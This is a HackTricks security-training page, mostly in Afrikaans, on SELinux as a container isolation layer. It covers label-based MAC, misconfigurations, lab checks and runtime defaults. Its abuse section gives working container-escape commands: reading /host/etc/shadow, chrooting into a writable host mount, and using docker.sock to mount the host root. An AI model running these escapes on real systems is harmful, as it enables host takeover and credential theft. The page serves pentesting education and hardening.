# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

SELinux is 'n **etiket-gebaseerde Mandatory Access Control** stelsel. Elke relevante proses en objek kan 'n sekuriteitskonteks dra, en die beleid bepaal watter domeine met watter tipes kan interaksie hê en op watter wyse. In container-omgewings beteken dit gewoonlik dat die runtime die container-proses onder 'n ingeperkte container-domein begin en die container-inhoud met ooreenstemmende tipes etiket. As die beleid behoorlik werk, kan die proses die dinge lees en skryf wat sy etiket veronderstel is om aan te raak, terwyl toegang tot ander gasheer-inhoud geweier word, selfs al word daardie inhoud sigbaar deur 'n mount.

Dit is een van die kragtigste beskermings aan die gasheerkant wat beskikbaar is in hoofstroom Linux container-implementasies. Dit is veral belangrik op Fedora, RHEL, CentOS Stream, OpenShift, en ander SELinux-gesentreerde ekosisteme. In daardie omgewings sal 'n beoordelaar wat SELinux ignoreer dikwels verkeerd verstaan waarom 'n ogenschijnlijk duidelike pad na gasheer-kompromie eintlik geblokkeer is.

## AppArmor Vs SELinux

Die maklikste hoëvlakverskil is dat AppArmor pad-gebaseerd is terwyl SELinux **etiket-gebaseerd** is. Dit het groot gevolge vir container-sekuriteit. 'n Pad-gebaseerde beleid kan anders optree as dieselfde gasheer-inhoud sigbaar word onder 'n onverwagte mount-pad. 'n Etiket-gebaseerde beleid vra eerder wat die objek se etiket is en wat die prosesdomein daarmee mag doen. Dit maak SELinux nie eenvoudig nie, maar dit maak dit robuust teen 'n klas pad-truuk-aanname wat verdedigers soms per ongeluk in AppArmor-gebaseerde stelsels maak.

Omdat die model etiket-georiënteerd is, is container volume-hantering en relabeling-besluite sekuriteitskrities. As die runtime of operateur etikette te breedsprakig verander om "make mounts work", kan die beleidgrens wat die werklas moes bevat baie swakker word as bedoel.

## Lab

Om te sien of SELinux op die gasheer aktief is:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Om bestaande etikette op die gasheer te ondersoek:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Om 'n normale uitvoering te vergelyk met een waarin etikettering gedeaktiveer is:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Op 'n SELinux-aktive gasheer is dit 'n baie praktiese demonstrasie omdat dit die verskil wys tussen 'n workload wat onder die verwagte container-domein loop en een wat van daardie afdwingingslaag ontdaan is.

## Runtime Usage

Podman is besonder goed afgestem op SELinux op stelsels waar SELinux deel van die platform-standaard is. Rootless Podman plus SELinux is een van die sterkste hoofstroom container-baselines omdat die proses reeds onbevoorreg is aan die gasheer-kant en steeds deur MAC policy beperk word. Docker kan ook SELinux gebruik waar dit ondersteun word, alhoewel administrateurs dit soms deaktiveer om 'n werkbare ompad vir volume-labeling-friksie te skep. CRI-O en OpenShift steun baie op SELinux as deel van hulle container-isolasie. Kubernetes kan ook SELinux-verwante instellings blootstel, maar hul waarde hang natuurlik af van of die node-OS werklik SELinux ondersteun en afdwing.

Die herhalende les is dat SELinux nie 'n opsionele garnering is nie. In die ekosisteme wat daaromheen gebou is, is dit deel van die verwagte sekuriteitsgrens.

## Misconfigurations

Die klassieke fout is `label=disable`. Operasioneel gebeur dit dikwels omdat 'n volume-mount geweier is en die vinnigste korttermynoplossing was om SELinux uit die vergelyking te verwyder in plaas van die etiketteringsmodel reg te stel. Nog 'n algemene fout is verkeerde heretikettering van host-inhoud. Ruim heretiketteringsoperasies kan die toepassing laat werk, maar hulle kan ook uitbrei wat die container toegelaat word om aan te raak veel verder as wat oorspronklik bedoel was.

Dit is ook belangrik om nie **geïnstalleer** SELinux met **effektiewe** SELinux te verwar nie. 'n Gasheer mag SELinux ondersteun en steeds in 'n permissiewe modus wees, of die runtime mag nie die workload onder die verwagte domein start nie. In daardie gevalle is die beskerming baie swakker as wat die dokumentasie mag voorstel.

## Abuse

Wanneer SELinux afwesig, permissief, of wyd deaktiveer is vir die workload, word gasheer-gemonteerde paaie baie makliker om te misbruik. Dieselfde bind mount wat andersins deur etikette beperk sou word, kan 'n direkte weg na gasheerdata of gasheermodifikasie word. Dit is veral relevant wanneer dit gekombineer word met skryfbare volume mounts, container runtime directories, of operasionele kortpaaie wat sensitiewe gasheerpaaie vir gerief blootgestel het.

SELinux verduidelik dikwels waarom 'n generiese breakout writeup onmiddellik op een gasheer werk, maar herhaaldelik op 'n ander faal, al lyk die runtime-vlae soortgelyk. Die ontbrekende bestanddeel is dikwels glad nie 'n namespace of 'n capability nie, maar 'n etiketgrens wat intak gebly het.

Die vinnigste praktiese kontrole is om die aktiewe konteks te vergelyk en dan gemonteerde host-paaie of runtime directories te peil wat normaalweg deur etikette beperk sou wees:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
As 'n host bind mount teenwoordig is en SELinux labeling gedeaktiveer of verswak is, kom inligtingsonthulling dikwels eers voor:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
As die mount skryfbaar is en die container effektief host-root vanuit die kernel se oogpunt is, is die volgende stap om beheerste wysiging van die host te toets in plaas van om te raai:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Op SELinux-ondersteunde gashere kan die verlies van etikette rondom runtime-toestandgidses ook direkte privilege-escalation-paaie blootstel:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Hierdie opdragte vervang nie 'n volledige escape chain nie, maar dit maak baie vinnig duidelik of SELinux die rede was waarom toegang tot host-data of wysiging van lêers aan die host-kant verhoed is.

### Volledige voorbeeld: SELinux Disabled + Writable Host Mount

As SELinux-labeling gedeaktiveer is en die host-lêerstelsel by `/host` as skryfbaar gemount is, raak 'n volledige host escape 'n normale bind-mount abuse-geval:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As die `chroot` slaag, werk die container-proses nou vanaf die gasheer-lêerstelsel:
```bash
id
hostname
cat /etc/passwd | tail
```
### Volledige Voorbeeld: SELinux afgeskakel + Runtime Directory

As die workload 'n runtime socket kan bereik sodra labels afgeskakel is, kan die escape aan die runtime gedelegeer word:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante waarneming is dat SELinux dikwels die beheer was wat presies hierdie soort host-path of runtime-state toegang verhinder het.

## Kontroles

Die doel van die SELinux-kontroles is om te bevestig dat SELinux aangeskakel is, die huidige sekuriteitskonteks te identifiseer, en te sien of die lêers of paaie waarna jy omgee werklik deur etikette beperk is.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
- As die huidige proses-konteks onvoorspelbaar of te wyd lyk, mag die workload nie onder die beoogde containerbeleid loop nie.
- As gasheer-gemonteerde lêers of runtime-gidse etikette het waartoe die proses te vryelik toegang kan kry, word bind mounts baie gevaarliker.

Wanneer jy 'n container op 'n SELinux-ondersteunde platform hersien, behandel etikettering nie as 'n sekondêre detail nie. In baie gevalle is dit een van die hoofredes waarom die host nog nie gekompromitteer is nie.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Afhanklik van die host | SELinux-afskeiding is beskikbaar op SELinux-aktiewe hosts, maar die presiese gedrag hang af van host/daemon-konfigurasie | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Gewoonlik geaktiveer op SELinux-hosts | SELinux-afskeiding is 'n normale deel van Podman op SELinux-stelsels, tensy dit gedeaktiveer is | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Nie gewoonlik outomaties op Pod-vlak toegewys nie | SELinux-ondersteuning bestaan, maar Pods benodig gewoonlik `securityContext.seLinuxOptions` of platform-spesifieke standaardwaardes; runtime- en node-ondersteuning is vereis | swak of breë `seLinuxOptions`, hardloop op permissive/disabled nodes, platformbeleid wat etikettering deaktiveer |
| CRI-O / OpenShift style deployments | Word dikwels intensief gebruik | SELinux is dikwels 'n kerndeel van die node-isolasie-model in hierdie omgewings | aangepaste beleide wat toegang te wyd maak, etikettering deaktiveer vir kompabiliteit |

SELinux-standaardinstellings is meer distribusie-afhanklik as seccomp-standaardinstellings. Op Fedora/RHEL/OpenShift-agtige stelsels is SELinux dikwels sentraal tot die isolasiemodel. Op nie-SELinux-stelsels is dit eenvoudig afwesig.
